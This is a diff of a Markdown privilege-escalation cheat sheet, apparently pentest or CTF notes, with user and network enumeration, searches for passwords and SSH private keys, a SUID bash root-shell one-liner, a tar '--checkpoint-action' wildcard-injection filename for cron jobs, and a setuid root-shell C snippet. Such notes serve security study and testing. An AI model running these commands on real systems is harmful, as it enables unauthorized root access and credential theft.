@@ -18,33 +18,33 @@ Architechture and cpu info - ```lscpu```
 
 ## User Enumeration
 
-Info about user - whoami, id
+Info about user - ```whoami, id```
 
-What can we run as sudo - sudo -l
+What can we run as sudo - ```sudo -l```
 
-Users - cat /etc/passwd, cat /etc/passwd | cut -d : -f 1
+Users - ```cat /etc/passwd, cat /etc/passwd | cut -d : -f 1```
 
 ## Network Enumeration
 
-IP info - ifconfig,
+IP info - ```ifconfig```
 
-Routing info - ip route
+Routing info - ```ip route```
 
-Connections - netstat
+Connections - ```netstat```
 
 ## Password Hunting
 
-Password phrases - grep --color=auto -rnw '/' -ie "Password=" --color=always 2> /dev/null
+Password phrases - ```grep --color=auto -rnw '/' -ie "Password=" --color=always 2> /dev/null```
 
-Password files - locate password
+Password files - ```locate password```
 
-Finding ssh keys - find / -name id_rsa 2> /dev/null
+Finding ssh keys - ```find / -name id_rsa 2> /dev/null```
 
 ## Useful commands
 
-echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p" > file
+```echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p" > file```
 
-cron wildcards
+###cron wildcards
 
 ```
 
@@ -58,7 +58,7 @@ touch /home/user/--checkpoint-action=exec=sh\ runme.sh
 
 ```
 
-echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
+```echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c```
 
 
 ## Automated Tools
